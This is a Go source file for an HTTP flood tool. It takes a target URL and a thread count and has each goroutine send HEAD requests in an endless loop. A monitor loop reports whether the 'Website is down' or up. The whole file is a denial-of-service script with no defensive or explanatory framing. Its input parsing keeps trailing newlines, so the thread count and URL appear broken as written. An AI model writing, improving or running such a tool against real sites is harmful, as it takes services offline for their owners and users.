package main

import (
	"fmt"
	"sync"
	"bufio"
	"os"
	"strconv"
	"time"
	"github.com/valyala/fasthttp"
)

func main() {
	var wg sync.WaitGroup

	reader := bufio.NewReader(os.Stdin)
	fmt.Print("Enter URL: ")
	url, _ := reader.ReadString('\n')

	fmt.Print("Enter number of threads: ")
	threads, _ := reader.ReadString('\n')
	numThreads, _ := strconv.Atoi(threads)

	for i := 0; i < numThreads; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			req := fasthttp.AcquireRequest()
			resp := fasthttp.AcquireResponse()
			defer func() {
				fasthttp.ReleaseRequest(req)
				fasthttp.ReleaseResponse(resp)
			}()

			req.Header.SetMethod("HEAD")
			req.SetRequestURI(url)

			for {
				err := fasthttp.Do(req, resp)
				if err != nil {
					fmt.Println(err)
					return
				}
			}
		}()
	}

	go func() {
		req := fasthttp.AcquireRequest()
		resp := fasthttp.AcquireResponse()
		defer func() {
			fasthttp.ReleaseRequest(req)
			fasthttp.ReleaseResponse(resp)
		}()

		req.Header.SetMethod("HEAD")
		req.SetRequestURI(url)

		for {
			start := time.Now()
			err := fasthttp.Do(req, resp)
			duration := time.Since(start)
			if err != nil {
				fmt.Println("Website is down")
			} else {
				fmt.Printf("Website is up (response time: %s)\n", duration)
			}
			time.Sleep(10 * time.Second)
		}
	}()

	wg.Wait()
}
